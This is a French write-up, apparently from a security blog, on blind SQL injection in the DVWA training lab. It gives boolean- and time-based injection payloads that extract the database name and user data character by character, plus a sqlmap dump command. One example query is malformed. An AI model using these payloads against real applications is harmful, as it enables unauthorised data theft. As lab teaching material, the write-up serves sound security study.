+++
title = "DVWA - Injection SQL (BLIND)"
date = 2025-12-25
categories = ["DVWA"]
description = "Explication technique"


[taxonomies]
tags = ["cybersécurité", "DVWA", "web"]
+++


SQL Injection Blind = injection sans retour de données direct (pas de dump colonnes). L'app répond binaire : "User ID exists" (TRUE) ou "User ID is MISSING" (FALSE). Exploitation via Boolean-based (différences réponse) ou Time-based (délais SLEEP).

## Easy
- Query : `SELECT * FROM users WHERE id='$id' AND >0`
- Boolean : `1' AND 1=1#` → "exists" (TRUE) ; `1' AND 1=2#` → "missing" (FALSE).
- Time : `1' AND IF(1=1,SLEEP(5),0)#` → délai 5s confirme vulnérabilité.

## Medium
- Déterminer nb colonnes : 1' ORDER BY 1# (exists) → 1' ORDER BY 3# (missing) = 2 colonnes.
- Extraire DB name (longueur puis chars):
  ```sql
  1' AND (SELECT LENGTH(database()))=4#
  1' AND ASCII(SUBSTRING((SELECT database()),1,1))=100;    # → 'd'=100
  ```
- Répétez pour chaque position/charset (32-126) → "dvwa".


## Hard
- Time extraction (plus fiable, pas de diff réponse visible) :
  ```html
  1' AND IF(ASCII(SUBSTRING((SELECT user FROM users LIMIT 0,1),1,1))>100,SLEEP(5),0)#
  ```
- Si délai 5s → char >100 (ex. 'g'=103)
- Pas délai → char ≤100
- Binaire search (64,96,112...) + SLEEP confirme bit par bit.
- Peut s'exploiter avec sqlmap, par exemple:
  ```bash
  sqlmap -u "http://dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=high;PHPSESSID=xxx" --technique=BT --dump
  ```
